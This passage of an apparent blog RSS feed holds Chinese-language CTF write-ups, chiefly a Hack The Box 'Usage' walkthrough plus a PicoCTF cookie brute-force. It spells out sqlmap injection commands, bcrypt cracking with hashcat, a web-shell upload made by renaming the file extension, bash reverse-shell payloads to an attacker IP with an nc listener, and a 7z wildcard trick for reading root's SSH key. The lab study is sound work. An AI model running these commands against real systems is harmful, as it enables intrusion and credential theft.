+&lt;p&gt;第二行 base64 編碼的是 reverse shell 的指令,請把下列改成你自己的ip
+bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/{YOUR IP}/{PORT} 0&amp;gt;&amp;amp;1&apos;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;5.在本地創建一個接收 Rverse Shell 的 &lt;code&gt;nc&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nc -lvnp {你剛剛設定的port}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkKbLD5gC.png&quot; alt=&quot;image&quot; /&gt;
+接受到對方主機回傳的 shell
+flag.txt 就在 root 裡面&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;總結&lt;/h2&gt;
+&lt;p&gt;&lt;s&gt;其實這題沒什麼技術性&lt;/s&gt;
+但是資訊安全就是靠累積經驗讓自己判斷甚麼時候該做甚麼的領域
+想到再補充&lt;/p&gt;
+</content:encoded></item><item><title>HTB - Usage</title><link>https://s0z.me/posts/htb---usage/</link><guid isPermaLink="true">https://s0z.me/posts/htb---usage/</guid><pubDate>Tue, 14 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;HTB - Usage&lt;/h1&gt;
+&lt;p&gt;Target IP : &lt;code&gt;10.10.11.18&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyhPj9_bR.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h1&gt;user.txt&lt;/h1&gt;
+&lt;h3&gt;Port Enumerate&lt;/h3&gt;
+&lt;p&gt;使用工具 :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Rustscan&lt;/li&gt;
+&lt;li&gt;nmap&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;使用命令 &lt;code&gt; rustscan -a 10.10.11.18 --ulimit 6000 -- -sC -sV -Pn&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HkuY9qdbR.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;掃出來 Port 後 , 會看到詳細兩個服務和版本&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1. 22/tcp open  ssh
+2. 80/tcp open  http
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/H1XTcqdbC.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;DNS for Virtual web hosting&lt;/h3&gt;
+&lt;p&gt;從上述掃描結果可以看到目標主機有個網頁伺服器
+但由於DNS 和 IP 對不上,所以我們要去&lt;code&gt;/etc/hosts&lt;/code&gt;增加對應關係&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJ9Sn5_-C.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;然後就可以進入網站&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Hyhw29uZA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;fuzz 過子目錄 , 帳號註冊和登入 ,以及 admin 頁面都沒有收穫&lt;/p&gt;
+&lt;h3&gt;SQL injection&lt;/h3&gt;
+&lt;p&gt;最後用 sqlmap 盲注 &lt;code&gt;http://usage.htb/forget-password&lt;/code&gt; 頁面&lt;/p&gt;
+&lt;p&gt;首先用 &lt;code&gt;burp Suite&lt;/code&gt; 抓取 &lt;code&gt;POST&lt;/code&gt; 請求&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;這邊使用 &lt;code&gt;FoxyProxy&lt;/code&gt; 插件
+因為它內建的瀏覽器真的太爛了...&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJ0y0qdbA.png&quot; alt=&quot;圖片&quot; /&gt;
+&lt;img src=&quot;https://hackmd.io/_uploads/rJ2eC5uZA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;把 &lt;code&gt;POST&lt;/code&gt; 請求存成一個檔案 我把它存到 &lt;code&gt;r.txt&lt;/code&gt;
+&lt;img src=&quot;https://hackmd.io/_uploads/ByNQgiOZC.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;先用以下指令
+&lt;code&gt;sqlmap -r r.txt --dbs --risk 3 --level 3 --threads 8 --batch&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;成功後得知他有三個資料庫&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;* imformatioa_schema
+* performajce_schema
+* usage_blog
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJIoys_bA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;我們需要的資訊肯定是在 &lt;code&gt;usage_blog&lt;/code&gt;
+所以我們 enum 一下裡面有哪些 Tables
+&lt;code&gt;sqlmap -r r.txt -D usage_blog --tables --threads 30 --batch&lt;/code&gt;
+&lt;img src=&quot;https://hackmd.io/_uploads/Hk9pxsu-A.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;很明顯 , 管理員的資訊應該都在 &lt;code&gt;admin_users&lt;/code&gt;上
+試著提取出裡面的資料&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sqlmap -r r.txt -D usage_blog -T admin_users -columns --threads 6 --batch  &lt;/code&gt;
+&lt;img src=&quot;https://hackmd.io/_uploads/ryu3MiubA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;接下來只需要提取 username 和 password 就好了
+&lt;code&gt;sqlmap -r r.txt -D usage_blog --sql-shell --threads 6 --batch&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;由於不知道啥原因沒辦法從 -C 選項直接拿資料
+所以直接用模擬shell的環境用 SQL 語法讀取&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SyJeVi_bC.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;得到&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;username : admin
+password : $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Hash Cat&lt;/h2&gt;
+&lt;p&gt;這個密碼肯定是 Hash 過的 , 所以我們沒辦法直接透過這段進入後台
+先想辦法得知他是什麼總類的 Hash 再來做還原的動作&lt;/p&gt;
+&lt;p&gt;使用&lt;code&gt;nth&lt;/code&gt;
+&lt;img src=&quot;https://hackmd.io/_uploads/SJDhVo_bA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;得知是使用 &lt;code&gt;bcrypt&lt;/code&gt;的方式 , 現在著手來還原
+使用著名的 &lt;code&gt;rockyou.txt&lt;/code&gt; 來當字典檔&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;hashcat -a 0 -m 3200 pass.txt rockyou_2.txt --force&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BkdYrj_WA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;結果馬上就跑出來了
+現在可以去後台瀏覽&lt;/p&gt;
+&lt;h2&gt;Reverse Shell | WEB shell&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkqRrsO-R.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;可以得知所有系統資訊和框架軟體版本
+但主角還是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http://admin.usage.htb/admin/auth/setting
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SkWSLjubR.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;這邊經過測試 , 無法上傳非圖像的後門
+所以要透過一些小步驟來繞過去&lt;/p&gt;
+&lt;p&gt;先用 burp suite 來攔截上傳封包
+&lt;img src=&quot;https://hackmd.io/_uploads/B14gwidb0.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;把第22行的 &lt;code&gt;filename=&quot;q.jpg&quot;&lt;/code&gt; 改成 &lt;code&gt;filename=&quot;q.php&quot;&lt;/code&gt;
+然後上傳上去&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BkXsPiOb0.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;302 代表上傳成功 , 如果出現其他的可能是你的令牌過期了
+要重新整理一次在攔截一次 POST 請求&lt;/p&gt;
+&lt;p&gt;接下來,手速要很快,因為它會定期清掉上傳上去的東西
+&lt;img src=&quot;https://hackmd.io/_uploads/BJPO_sdZC.png&quot; alt=&quot;圖片&quot; /&gt;
+可以看到檔案能回傳ls的指令,代表我們成功了
+現在準備 payload 和 listener 就能創建一個reverse shell&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;payload = %2Fbin%2Fbash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.5%2F4244%200%3E%261%22
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJR6Kj_W0.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJJDqjub0.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;當我們成功接收到 reverse shell
+到 &lt;code&gt;/home/dash&lt;/code&gt; 底下能拿到 &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;
+&lt;h1&gt;root.txt&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rJPeiodb0.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;接下來查看底下的檔案中有沒有有用的訊息
+找到一個名為 &lt;code&gt;.monitrc&lt;/code&gt; 的檔案
+&lt;img src=&quot;https://hackmd.io/_uploads/HyK2is_WA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;感覺是另一個帳戶的密碼,我們用&lt;code&gt;xander&lt;/code&gt;的身分登入ssh看看&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJdLni_W0.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;拿到 ssh 後會做幾件事情&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;1. 看 ID 當前用戶組有什麼可以用的
+2. sudo -l
+3. 看開放的port
+4. linpeas
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;跑一次 &lt;code&gt;sudo -l&lt;/code&gt; 發現有一個二進制是我能用sudo跑的
+&lt;img src=&quot;https://hackmd.io/_uploads/H1OI6iOWR.png&quot; alt=&quot;圖片&quot; /&gt;
+用 scp 把它載回本地拆&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;scp xander@10.10.11.18:/usr/bin/usage_management ~/
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Reverse Engineering&lt;/h2&gt;
+&lt;p&gt;我們用 &lt;code&gt;ghidra&lt;/code&gt;分析一輪拆開來看看&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/ryfi0o_bR.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;在 &lt;code&gt;backupWebContent(void)&lt;/code&gt; 函式看到調用到system來執行指令 , 通常這個地方是可以被利用的&lt;/p&gt;
+&lt;p&gt;然而在網路上看到這一篇文章 : &lt;a href=&quot;https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z&quot;&gt;HackTricks&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJRw13_bA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;7z 會把我們所創建的 @foo 檔案當成目錄表
+然而因為不是目錄表它會在執行過程中報錯,並且打印出這個文件
+這邊我們就可以用sudo的權限去打印出我們想要的資料&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/BJv_W3u-C.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;這邊選擇打印出 root 底下的 ssh 密鑰&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HkssbnuZ0.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;打印出來後把金鑰整理成可以使用的格式&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkGgzndZA.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;然後記得 &lt;code&gt;chmod 600 {KEY_FILE}&lt;/code&gt;
+再使用 &lt;code&gt;ssh -i key root@10.10.11.18&lt;/code&gt;登入&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HyxOz2dZ0.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;之後再直接 &lt;code&gt;ls&lt;/code&gt; 就能拿到 &lt;code&gt;root.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/B1Pqz3_WR.png&quot; alt=&quot;圖片&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+</content:encoded></item><item><title>PicoCTF - Cookies</title><link>https://s0z.me/posts/picoctf---cookies/</link><guid isPermaLink="true">https://s0z.me/posts/picoctf---cookies/</guid><pubDate>Tue, 14 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;PicoCTF - Cookies&lt;/h1&gt;
+&lt;h2&gt;題目:&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SyWLEKT66.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;誰不愛Cookies? 找出最好的那一個餅乾&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;進入頁面後看到
+&lt;img src=&quot;https://hackmd.io/_uploads/HknnHYaT6.png&quot; alt=&quot;image&quot; /&gt;
+直接輸入 &quot;snickerdoodle&quot; 觀察 Cookies 數值變化&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;觀察到 Cookies 的數值從 -1 變為 0
+&lt;img src=&quot;https://hackmd.io/_uploads/H19qwtTTT.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;改成 1 後 /check 底下重新整理後變為 Chocolate Clip cookies
+&lt;img src=&quot;https://hackmd.io/_uploads/HJxWdY66p.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3&gt;解題&lt;/h3&gt;
+&lt;p&gt;這題目唯一的變數就是 name 的值 , 而增加值會跑出不同總類的餅乾 , 題目說要找出最好的餅乾 , 所以這邊我使用 Brute force 來看能不能取得其他資料&lt;/p&gt;
+&lt;p&gt;:::info&lt;/p&gt;
+&lt;h4&gt;使用工具 Curl&lt;/h4&gt;
+&lt;p&gt;參數&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;-H 添加 HTTP 請求的 HEAD&lt;/li&gt;
+&lt;li&gt;-s 不輸出錯誤和進度訊息&lt;/li&gt;
+&lt;li&gt;-L 讓 Curl 隨著伺服器重定向&lt;/li&gt;
+&lt;li&gt;向目標發出 HEAD 請求 , 並且把 HEAD打印出來
+:::&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;使用 Bash 寫個簡單的腳本來自動過濾結果&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;for i in {1..20}; 
+do
+
+con=$(curl -s http://mercury.picoctf.net:29649/ -H &quot;Cookie: name=$i; Path=/&quot; -L)
+
+if ! echo &quot;$con&quot; | grep -q &quot;Not very special&quot;; then
+#grep -q 用來找尋是否出現該字串 , 找到的話為 True , 由於有這段話代表說尚未找尋到有用的資料 , 所以 if !會反轉輸出結果為 False 以便執行 then後面的語句  
+echo &quot;Cookie $i is special&quot;
+
+echo $con | grep &quot;pico&quot;
+
+break
+
+fi
+
+done
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;最後輸出得到結果為
+&lt;img src=&quot;https://hackmd.io/_uploads/BJGlpY6ap.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h3&gt;所需知識&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;編輯自動化腳本 如Bash,Python etc...&lt;/li&gt;
+&lt;li&gt;網站請求相關知識 如:HEAD,POST,重定向 etc...&lt;/li&gt;
+&lt;li&gt;Linux指令熟悉 如 grep&lt;/li&gt;
+&lt;li&gt;&lt;s&gt;通靈&lt;/s&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</content:encoded></item></channel></rss>
